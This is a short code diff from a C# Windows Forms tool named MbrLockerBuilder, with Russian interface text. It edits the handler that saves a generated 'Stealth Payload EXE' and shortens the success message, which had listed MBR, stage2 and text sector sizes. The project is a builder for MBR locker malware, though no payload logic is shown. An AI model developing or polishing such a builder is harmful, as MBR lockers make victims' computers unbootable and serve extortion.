@@ -516,18 +516,12 @@ namespace MbrLockerBuilder
                 this.saveFileDialog.Title = "Сохранить Stealth Payload EXE";
                 this.saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                 if (this.saveFileDialog.ShowDialog() == DialogResult.OK)
-                {
-                    File.WriteAllBytes(this.saveFileDialog.FileName, payloadBytes);
-                    this.lblStatus.Text = "Готово: " + Path.GetFileName(this.saveFileDialog.FileName);
+{
+    File.WriteAllBytes(this.saveFileDialog.FileName, payloadBytes);
+    this.lblStatus.Text = "Готово: " + Path.GetFileName(this.saveFileDialog.FileName);
 
-                    MessageBox.Show($"Stealth Payload создан!\n\n" +
-                        $"Размер образа: {fullImage.Length} байт ({fullImage.Length / 512} секторов)\n" +
-                        $"MBR: {mbrBytes.Length} байт\n" +
-                        $"Stage2: {stage2Bytes.Length} байт\n" +
-                        $"Текст: {textBytes.Length} байт (сектора 4-6)\n" +
-                        $"Путь: {this.saveFileDialog.FileName}",
-                        "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                }
+    MessageBox.Show("Mbr locker создан!", "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
+}
                 else
                 {
                     this.lblStatus.Text = "Отменено";
